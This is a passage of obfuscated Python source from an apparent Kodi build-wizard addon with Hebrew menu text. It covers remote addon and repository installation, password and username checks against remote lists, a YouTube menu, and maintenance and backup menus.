						addFile (O00O0O0O0O00O0OO0 ,'addoninstall',OO00000O0OO0O00OO ,O0O0OOO0OO0O00O0O ,description =OO00O0O0OOO0OO0O0 ,icon =OO0OO0OOO0OO000O0 ,fanart =OOO0O0O0OO0O00O00 ,themeit =THEME2 )#line:2502
					if O000OOO0OO000OO0O <1 :#line:2503
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2504
			else :#line:2505
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2506
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2507
		else :#line:2508
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2509
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2510
			addFile ('%s'%O0O0OOOOOOOOO0OO0 ,'',themeit =THEME3 )#line:2511
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2512
	setView ('files','viewType')#line:2513
def addonInstaller (O0OO000O0O00O00O0 ,OO00O0OOOO0OO0OOO ):#line:2515
	if not ADDONFILE =='http://':#line:2516
		OO0O000O000O0O0OO =wiz .workingURL (OO00O0OOOO0OO0OOO )#line:2517
		if OO0O000O000O0O0OO ==True :#line:2518
			O00O0OO0O00OO0O0O =wiz .openURL (OO00O0OOOO0OO0OOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2519
			O0O0OO0O00O00OO0O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OO000O0O00O00O0 ).findall (O00O0OO0O00OO0O0O )#line:2520
			if len (O0O0OO0O00O00OO0O )>0 :#line:2521
				for O00OO0O00000000OO ,OO00O0OOOO0OO0OOO ,O000O0O00OO00OO00 ,O0O00OOO0O0O0O0O0 ,OOOO0OOOO0000O0O0 ,OOOOO0O00000O00OO ,O0OOO00OO0O0O00OO ,O0000O00O00O0000O ,OOOO0OO0O000OOOO0 in O0O0OO0O00O00OO0O :#line:2522
					if os .path .exists (os .path .join (ADDONS ,O0OO000O0O00O00O0 )):#line:2523
						OO0OOOO0000O0OO0O =['Launch Addon','Remove Addon']#line:2524
						OO0OO00O0O000O0OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0OOOO0000O0OO0O )#line:2525
						if OO0OO00O0O000O0OO ==0 :#line:2526
							wiz .ebi ('RunAddon(%s)'%O0OO000O0O00O00O0 )#line:2527
							xbmc .sleep (1000 )#line:2528
							return True #line:2529
						elif OO0OO00O0O000O0OO ==1 :#line:2530
							wiz .cleanHouse (os .path .join (ADDONS ,O0OO000O0O00O00O0 ))#line:2531
							try :wiz .removeFolder (os .path .join (ADDONS ,O0OO000O0O00O00O0 ))#line:2532
							except :pass #line:2533
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OO000O0O00O00O0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2534
								removeAddonData (O0OO000O0O00O00O0 )#line:2535
							wiz .refresh ()#line:2536
							return True #line:2537
						else :#line:2538
							return False #line:2539
					O0O0O000000OO0O00 =os .path .join (ADDONS ,O000O0O00OO00OO00 )#line:2540
					if not O000O0O00OO00OO00 .lower ()=='none'and not os .path .exists (O0O0O000000OO0O00 ):#line:2541
						wiz .log ("Repository not installed, installing it")#line:2542
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0OO000O0O00O00O0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000O0O00OO00OO00 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2543
							O0O000OO000O0O0OO =wiz .parseDOM (wiz .openURL (O0O00OOO0O0O0O0O0 ),'addon',ret ='version',attrs ={'id':O000O0O00OO00OO00 })#line:2544
							if len (O0O000OO000O0O0OO )>0 :#line:2545
								OO00O0O0O0OOOOOOO ='%s%s-%s.zip'%(OOOO0OOOO0000O0O0 ,O000O0O00OO00OO00 ,O0O000OO000O0O0OO [0 ])#line:2546
								wiz .log (OO00O0O0O0OOOOOOO )#line:2547
								if KODIV >=17 :wiz .addonDatabase (O000O0O00OO00OO00 ,1 )#line:2548
								installAddon (O000O0O00OO00OO00 ,OO00O0O0O0OOOOOOO )#line:2549
								wiz .ebi ('UpdateAddonRepos()')#line:2550
								wiz .log ("Installing Addon from Kodi")#line:2552
								O0O0OOO0OO00OOOO0 =installFromKodi (O0OO000O0O00O00O0 )#line:2553
								wiz .log ("Install from Kodi: %s"%O0O0OOO0OO00OOOO0 )#line:2554
								if O0O0OOO0OO00OOOO0 :#line:2555
									wiz .refresh ()#line:2556
									return True #line:2557
							else :#line:2558
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O000O0O00OO00OO00 )#line:2559
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0OO000O0O00O00O0 ,O000O0O00OO00OO00 ))#line:2560
					elif O000O0O00OO00OO00 .lower ()=='none':#line:2561
						wiz .log ("No repository, installing addon")#line:2562
						O0OOOOOOOOO0O000O =O0OO000O0O00O00O0 #line:2563
						O00O0O000OO0O0O00 =OO00O0OOOO0OO0OOO #line:2564
						installAddon (O0OO000O0O00O00O0 ,OO00O0OOOO0OO0OOO )#line:2565
						wiz .refresh ()#line:2566
						return True #line:2567
					else :#line:2568
						wiz .log ("Repository installed, installing addon")#line:2569
						O0O0OOO0OO00OOOO0 =installFromKodi (O0OO000O0O00O00O0 ,False )#line:2570
						if O0O0OOO0OO00OOOO0 :#line:2571
							wiz .refresh ()#line:2572
							return True #line:2573
					if os .path .exists (os .path .join (ADDONS ,O0OO000O0O00O00O0 )):return True #line:2574
					O0O00O0OOOOOO0O00 =wiz .parseDOM (wiz .openURL (O0O00OOO0O0O0O0O0 ),'addon',ret ='version',attrs ={'id':O0OO000O0O00O00O0 })#line:2575
					if len (O0O00O0OOOOOO0O00 )>0 :#line:2576
						OO00O0OOOO0OO0OOO ="%s%s-%s.zip"%(OO00O0OOOO0OO0OOO ,O0OO000O0O00O00O0 ,O0O00O0OOOOOO0O00 [0 ])#line:2577
						wiz .log (str (OO00O0OOOO0OO0OOO ))#line:2578
						if KODIV >=17 :wiz .addonDatabase (O0OO000O0O00O00O0 ,1 )#line:2579
						installAddon (O0OO000O0O00O00O0 ,OO00O0OOOO0OO0OOO )#line:2580
						wiz .refresh ()#line:2581
					else :#line:2582
						wiz .log ("no match");return False #line:2583
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2584
		else :wiz .log ("[Addon Installer] Text File: %s"%OO0O000O000O0O0OO )#line:2585
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2586
def installFromKodi (OO0O0OO00OOO00000 ,over =True ):#line:2588
	if over ==True :#line:2589
		xbmc .sleep (2000 )#line:2590
	wiz .ebi ('RunPlugin(plugin://%s)'%OO0O0OO00OOO00000 )#line:2592
	if not wiz .whileWindow ('yesnodialog'):#line:2593
		return False #line:2594
	xbmc .sleep (1000 )#line:2595
	if wiz .whileWindow ('okdialog'):#line:2596
		return False #line:2597
	wiz .whileWindow ('progressdialog')#line:2598
	if os .path .exists (os .path .join (ADDONS ,OO0O0OO00OOO00000 )):return True #line:2599
	else :return False #line:2600
def installAddon (O0OO00O0OO00O0000 ,OOO0OOOOO0000O0O0 ):#line:2602
	if not wiz .workingURL (OOO0OOOOO0000O0O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OO00O0OO00O0000 ,COLOR2 ));return #line:2603
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2604
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0OO00O0000 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2605
	OOO00O00OO0O0O0O0 =OOO0OOOOO0000O0O0 .split ('/')#line:2606
	O00OO0OOO00O0000O =os .path .join (PACKAGES ,OOO00O00OO0O0O0O0 [-1 ])#line:2607
	try :os .remove (O00OO0OOO00O0000O )#line:2608
	except :pass #line:2609
	downloader .download (OOO0OOOOO0000O0O0 ,O00OO0OOO00O0000O ,DP )#line:2610
	OO000OOOO0OOOOO0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0OO00O0000 )#line:2611
	DP .update (0 ,OO000OOOO0OOOOO0O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2612
	OOO0O0O000O00000O ,OOOO00O0O00OO00OO ,O000OO0O00O00OO0O =extract .all (O00OO0OOO00O0000O ,ADDONS ,DP ,title =OO000OOOO0OOOOO0O )#line:2613
	DP .update (0 ,OO000OOOO0OOOOO0O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2614
	installed (O0OO00O0OO00O0000 )#line:2615
	installDep (O0OO00O0OO00O0000 ,DP )#line:2616
	DP .close ()#line:2617
	wiz .ebi ('UpdateAddonRepos()')#line:2618
	wiz .ebi ('UpdateLocalAddons()')#line:2619
	wiz .refresh ()#line:2620
def installDep (OOO00OOOOO000OOO0 ,DP =None ):#line:2622
	OOOO0OOOOOO0000OO =os .path .join (ADDONS ,OOO00OOOOO000OOO0 ,'addon.xml')#line:2623
	if os .path .exists (OOOO0OOOOOO0000OO ):#line:2624
		O0OO00OOOOO000O0O =open (OOOO0OOOOOO0000OO ,mode ='r');O00000000O00OOO00 =O0OO00OOOOO000O0O .read ();O0OO00OOOOO000O0O .close ();#line:2625
		OO00OO0O00OOO000O =wiz .parseDOM (O00000000O00OOO00 ,'import',ret ='addon')#line:2626
		for O0O0OOO0O0O0OOOO0 in OO00OO0O00OOO000O :#line:2627
			if not 'xbmc.python'in O0O0OOO0O0O0OOOO0 :#line:2628
				if not DP ==None :#line:2629
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0OOO0O0O0OOOO0 ))#line:2630
				wiz .createTemp (O0O0OOO0O0O0OOOO0 )#line:2631
def installed (O0O0O000O0000O0OO ):#line:2658
	O0OO000O0O0O00OO0 =os .path .join (ADDONS ,O0O0O000O0000O0OO ,'addon.xml')#line:2659
	if os .path .exists (O0OO000O0O0O00OO0 ):#line:2660
		try :#line:2661
			OOO000O0OOOOOO00O =open (O0OO000O0O0O00OO0 ,mode ='r');OOO0OOOOO000OO0OO =OOO000O0OOOOOO00O .read ();OOO000O0OOOOOO00O .close ()#line:2662
			OOOO0000O0OOO0O0O =wiz .parseDOM (OOO0OOOOO000OO0OO ,'addon',ret ='name',attrs ={'id':O0O0O000O0000O0OO })#line:2663
			OO00000OO0OOOO0OO =os .path .join (ADDONS ,O0O0O000O0000O0OO ,'icon.png')#line:2664
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0000O0OOO0O0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO00000OO0OOOO0OO )#line:2665
		except :pass #line:2666
def youtubeMenu (url =None ):#line:2668
	if not YOUTUBEFILE =='http://':#line:2669
		if url ==None :#line:2670
			O000O0OO0O0OO0000 =wiz .workingURL (YOUTUBEFILE )#line:2671
			OO00O0000OO0OO000 =uservar .YOUTUBEFILE #line:2672
		else :#line:2673
			O000O0OO0O0OO0000 =wiz .workingURL (url )#line:2674
			OO00O0000OO0OO000 =url #line:2675
		if O000O0OO0O0OO0000 ==True :#line:2676
			OO0O00O00OOOOO00O =wiz .openURL (OO00O0000OO0OO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2677
			OOO0O0OO0OOO0000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O00O00OOOOO00O )#line:2678
			if len (OOO0O0OO0OOO0000O )>0 :#line:2679
				for OOO0OO0OOO000O000 ,O00OOO0000OO00OOO ,url ,O0OO00O0O00OO0000 ,O00OOO00O0000OO00 ,O00OO0OOO00O0O00O in OOO0O0OO0OOO0000O :#line:2680
					if O00OOO0000OO00OOO .lower ()=="yes":#line:2681
						addDir ("[B]%s[/B]"%OOO0OO0OOO000O000 ,'youtube',url ,description =O00OO0OOO00O0O00O ,icon =O0OO00O0O00OO0000 ,fanart =O00OOO00O0000OO00 ,themeit =THEME3 )#line:2682
					else :#line:2683
						addFile (OOO0OO0OOO000O000 ,'viewVideo',url =url ,description =O00OO0OOO00O0O00O ,icon =O0OO00O0O00OO0000 ,fanart =O00OOO00O0000OO00 ,themeit =THEME2 )#line:2684
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2685
		else :#line:2686
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2687
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2688
			addFile ('%s'%O000O0OO0O0OO0000 ,'',themeit =THEME3 )#line:2689
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2690
	setView ('files','viewType')#line:2691
def STARTP ():#line:2692
	OO0OO0OO0O0O0OO00 =(ADDON .getSetting ("pass"))#line:2693
	if BUILDNAME =="":#line:2694
	 if not NOTIFY =='true':#line:2695
          O0O00O0OO0000O0OO =wiz .workingURL (NOTIFICATION )#line:2696
	 if not NOTIFY2 =='true':#line:2697
          O0O00O0OO0000O0OO =wiz .workingURL (NOTIFICATION2 )#line:2698
	 if not NOTIFY3 =='true':#line:2699
          O0O00O0OO0000O0OO =wiz .workingURL (NOTIFICATION3 )#line:2700
	O0OO0O0O00OO000O0 =OO0OO0OO0O0O0OO00 #line:2701
	O0O00O0OO0000O0OO =urllib2 .Request (SPEED )#line:2702
	OOOOOOOO0O00O0000 =urllib2 .urlopen (O0O00O0OO0000O0OO )#line:2703
	O0OOOOOOOOOOO00OO =OOOOOOOO0O00O0000 .readlines ()#line:2705
	O00O0OO00OOO0OOOO =0 #line:2709
	for O00OO00O0OOO0OO00 in O0OOOOOOOOOOO00OO :#line:2710
		if O00OO00O0OOO0OO00 .split (' ==')[0 ]==OO0OO0OO0O0O0OO00 or O00OO00O0OOO0OO00 .split ()[0 ]==OO0OO0OO0O0O0OO00 :#line:2711
			O00O0OO00OOO0OOOO =1 #line:2712
			break #line:2713
	if O00O0OO00OOO0OOOO ==0 :#line:2714
					O00OOO000OOO000O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2715
					if O00OOO000OOO000O0 :#line:2717
						ADDON .openSettings ()#line:2719
						sys .exit ()#line:2721
					else :#line:2722
						sys .exit ()#line:2723
	return 'ok'#line:2727
def STARTP2 ():#line:2728
	OO0000OOOO000OO00 =(ADDON .getSetting ("user"))#line:2729
	OOOO0OO00O0OOOO00 =(UNAME )#line:2731
	O00OOO0O0O0000O00 =urllib2 .urlopen (OOOO0OO00O0OOOO00 )#line:2732
	OOO0OO00O0O0000OO =O00OOO0O0O0000O00 .readlines ()#line:2733
	O0O0OO000O0OOOOO0 =0 #line:2734
	for O0OOO000O0O0OOOO0 in OOO0OO00O0O0000OO :#line:2737
		if O0OOO000O0O0OOOO0 .split (' ==')[0 ]==OO0000OOOO000OO00 or O0OOO000O0O0OOOO0 .split ()[0 ]==OO0000OOOO000OO00 :#line:2738
			O0O0OO000O0OOOOO0 =1 #line:2739
			break #line:2740
	if O0O0OO000O0OOOOO0 ==0 :#line:2741
		OOO0OOOOO000O00OO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2742
		if OOO0OOOOO000O00OO :#line:2744
			ADDON .openSettings ()#line:2746
			sys .exit ()#line:2749
		else :#line:2750
			sys .exit ()#line:2751
	return 'ok'#line:2755
def passandpin ():#line:2756
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2757
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2758
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2759
def passandUsername ():#line:2760
	ADDON .openSettings ()#line:2761
def folderback ():#line:2764
    OOO00OOOOOOO00OOO =ADDON .getSetting ("path")#line:2765
    if OOO00OOOOOOO00OOO :#line:2766
      OOO00OOOOOOO00OOO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2767
      ADDON .setSetting ("path",OOO00OOOOOOO00OOO )#line:2768
def backmyupbuild ():#line:2771
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2775
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2776
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2777
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2781
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2783
def maintMenu (view =None ):#line:2787
	OO00OOO00O00000O0 ='[B][COLOR green]ON[/COLOR][/B]';OO00000OOOO0O0OO0 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2789
	OO0O00OO00OOOO0O0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2790
	OO0O0O0O0000OOOO0 ='true'if AUTOCACHE =='true'else 'false'#line:2791
	OOOOO0O0O00O0O0OO ='true'if AUTOPACKAGES =='true'else 'false'#line:2792
	OO0000O00O00OOOOO ='true'if AUTOTHUMBS =='true'else 'false'#line:2793
	OOO00OOOO00O00O00 ='true'if SHOWMAINT =='true'else 'false'#line:2794
	OO0O000000OO000OO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2795
	OO00O00OOOOOOO0OO ='true'if INCLUDEALL =='true'else 'false'#line:2796
	OOO00OO000O0OO000 ='true'if THIRDPARTY =='true'else 'false'#line:2797
	if wiz .Grab_Log (True )==False :O000O00000OOO000O =0 #line:2798
	else :O000O00000OOO000O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2799
	if wiz .Grab_Log (True ,True )==False :O000O0O0OOO0OOO00 =0 #line:2800
	else :O000O0O0OOO0OOO00 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2801
	O0000O000000OOO0O =int (O000O00000OOO000O )+int (O000O0O0OOO0OOO00 )#line:2802
	O0OOOOOO00OOOOOO0 =str (O0000O000000OOO0O )+' Error(s) Found'if O0000O000000OOO0O >0 else 'None Found'#line:2803
	OO0OOOO000OO0O0O0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2804
	if OO00O00OOOOOOO0OO =='true':#line:2805
		OOOOOOOOO00O00O0O ='true'#line:2806
		O0OOOOOO0O0OO0OOO ='true'#line:2807
		OOO000O0O00O000OO ='true'#line:2808
		OO0O0O00O0OO000OO ='true'#line:2809
		OOO0O00OO0O0OOOO0 ='true'#line:2810
		O0O0OOO00000O0O0O ='true'#line:2811
		OOO00000OOOOOO0OO ='true'#line:2812
		OO0OOO00OO000000O ='true'#line:2813
	else :#line:2814
		OOOOOOOOO00O00O0O ='true'if INCLUDEBOB =='true'else 'false'#line:2815
		O0OOOOOO0O0OO0OOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2816
		OOO000O0O00O000OO ='true'if INCLUDESPECTO =='true'else 'false'#line:2817
		OO0O0O00O0OO000OO ='true'if INCLUDEGENESIS =='true'else 'false'#line:2818
		OOO0O00OO0O0OOOO0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2819
		O0O0OOO00000O0O0O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2820
		OOO00000OOOOOO0OO ='true'if INCLUDESALTS =='true'else 'false'#line:2821
		OO0OOO00OO000000O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2822
	O000O00OOOOOOO000 =wiz .getSize (PACKAGES )#line:2823
	O0O0O0O0OOOOOO0O0 =wiz .getSize (THUMBS )#line:2824
	OO00O00O0000O00OO =wiz .getCacheSize ()#line:2825
	OO0000O0O0OOO0OOO =O000O00OOOOOOO000 +O0O0O0O0OOOOOO0O0 +OO00O00O0000O00OO #line:2826
	O00O0O0O0O0O0OOOO =['Daily','Always','3 Days','Weekly']#line:2827
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2828
	if view =="clean"or SHOWMAINT =='true':#line:2829
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0000O0O0OOO0OOO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00O00O0000O00OO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O00OOOOOOO000 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0O0O0OOOOOO0O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2837
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2838
	if view =="addon"or SHOWMAINT =='false':#line:2839
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2846
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2847
	if view =="misc"or SHOWMAINT =='true':#line:2848
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('View Errors in Log: %s'%(O0OOOOOO00OOOOOO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('Clear Wizard Log File%s'%OO0OOOO000OO0O0O0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2857
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2858
	if view =="backup"or SHOWMAINT =='true':#line:2859
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2872
	if view =="tweaks"or SHOWMAINT =='true':#line:2873
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2874
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		else :#line:2876
			if os .path .exists (ADVANCED ):#line:2877
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2878
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2879
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2880
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2886
	addFile ('Show All Maintenance: %s'%OOO00OOOO00O00O00 .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2887
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2888
	addFile ('Third Party Wizards: %s'%OOO00OO000O0OO000 .replace ('true',OO00OOO00O00000O0 ).replace ('false',OO00000OOOO0O0OO0 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2889
	if OOO00OO000O0OO000 =='true':#line:2890
		O00O0000OOO00OOO0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2891
		OO000O000O00O0000 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2892
		O000O0OO0000OOO00 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2893
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O0000OOO00OOO0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO000O000O00O0000 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2895
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000O0OO0000OOO00 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2896
